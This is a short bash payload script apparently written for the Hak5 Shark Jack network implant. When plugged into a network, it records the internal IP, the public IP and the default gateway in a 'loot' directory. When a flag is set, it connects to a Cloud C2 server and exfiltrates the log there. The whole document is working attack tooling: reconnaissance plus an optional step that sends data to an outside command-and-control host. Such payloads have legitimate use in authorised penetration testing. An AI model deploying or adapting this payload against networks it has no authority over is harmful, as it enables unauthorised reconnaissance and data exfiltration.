#!/bin/bash
#
# Title:        IP Info
# Author:       Hak5Darren
# Version:      1.0
#
# Description:	This payload gathers internal and external IP address info,
# including default gateway, saving the log to the loot directory and
# optionally exfiltrating the log to Cloud C2 if CLOUDC2=1
#
# LED SETUP (Magenta)... Setting logs and waiting for IP address from DHCP
# LED ATTACK (Yellow Blink)... Saving IP address information
# LED FAIL (Red Blink)... Failed to gather public IP address
# LED SPECIAL (Cyan Blink)... Exfiltrating log to Cloud C2
# LED FINISH (Green Fast Blink to Solid)... Payload successful

CLOUDC2=0
LOOT_DIR=/root/loot/ipinfo
PUBLIC_IP_URL="http://ipinfo.io/ip"

function FAIL() { LED FAIL; exit; }
LED SETUP

# Make log file
mkdir -p $LOOT_DIR
LOG_FILE="ipinfo_$(find $LOOT_DIR -type f | wc -l).log"
LOG="$LOOT_DIR/$LOG_FILE"

# Ask for IP address
NETMODE DHCP_CLIENT

# Wait until Shark Jack has an IP address
while ! ifconfig eth0 | grep "inet addr"; do sleep 1; done

LED ATTACK
# Gather IP info and save log
INTERNALIP=$(ifconfig eth0 | grep "inet addr" | awk {'print $2'} | awk -F: {'print $2'})
GATEWAY=$(route | grep default | awk {'print $2'})
PUBLICIP=$(wget --timeout=30 $PUBLIC_IP_URL -qO -) || FAIL
echo -e "Date: $(date)\n\
Internal IP Address: $INTERNALIP\n\
Public IP Address: $PUBLICIP\n\
Gateway: $GATEWAY\n" >> $LOG

# Optionally connect to Cloud C2, wait for connection and exfiltrate loot
if [ "$CLOUDC2" = "1" ]; then
    LED SPECIAL
    C2CONNECT
    while ! pgrep cc-client; do sleep 1; done
    C2EXFIL STRING $LOG IPinfo
fi

LED FINISH